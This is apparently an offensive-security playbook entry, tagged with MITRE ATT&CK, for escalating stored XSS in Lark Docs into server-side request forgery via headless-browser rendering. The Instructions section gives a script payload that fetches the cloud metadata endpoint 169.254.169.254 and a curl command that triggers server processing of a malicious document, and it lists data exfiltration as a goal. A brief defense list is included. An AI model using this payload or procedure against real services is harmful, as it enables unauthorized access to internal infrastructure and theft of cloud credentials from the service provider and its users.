---
tags:
  - ssrf
  - headless-browser
  - lark-docs
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/trigger-document-process]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:56:19.922Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: fca10af8-584a-47f7-b26d-ca0e42a14680
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-via-Headless-Browser-Processing

## Summary

This procedure escalates a stored XSS payload in Lark Docs to SSRF by triggering server-side document processing in a headless browser, allowing forged requests to internal or external resources.

## Description

When Lark Docs processes or renders documents server-side using a headless browser (e.g., for previews or exports), the injected XSS payload executes in that context. Without request restrictions, the browser can be manipulated to issue SSRF requests, potentially exposing internal services or metadata. This requires the initial XSS injection and an action to invoke server processing.

## Requirements

1. Pre-injected XSS payload in a Lark Docs document
2. Ability to trigger server-side rendering (e.g., via share or export)
3. Knowledge of target internal endpoints for SSRF

## Defense

Defensive measures and detection strategies:

- Restrict headless browser network access to whitelisted domains
- Disable JavaScript execution in server-side rendering
- Log and monitor outbound requests from server processes

## Objectives

1. Execute payload in server context for SSRF
2. Access unauthorized internal resources
3. Exfiltrate data via forged requests

## Instructions

### Step 1: Prepare SSRF Payload

**Context**: Modify the XSS to include SSRF logic targeting internal resources.

Update the document with a payload like `<script>var img = new Image(); img.src = 'http://169.254.169.254/latest/meta-data/';</script>` to fetch metadata.

### Step 2: Trigger Server Processing

**Context**: Invoke actions that cause the server to render the document in headless browser.

**Command** ([[commands/trigger-document-process]]):
```bash
# Simulate trigger via curl (or use UI: share/export document)
curl -X POST 'https://docs.larksuite.com/api/v1/documents/process' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"doc_id": "MALICIOUS_DOC_ID"}'
```

> This sends a request to process the document, executing the payload server-side. In practice, use the web UI to share or preview.

### Step 3: Verify SSRF

**Context**: Check for successful request forgery.

Monitor network traffic or set up a listener on the target internal endpoint to capture the request.

**Expected Output**: Request to internal resource (e.g., AWS metadata) from server IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/trigger-document-process]]

## Tools Used


## Tags

- [[ssrf]]
- [[headless-browser]]
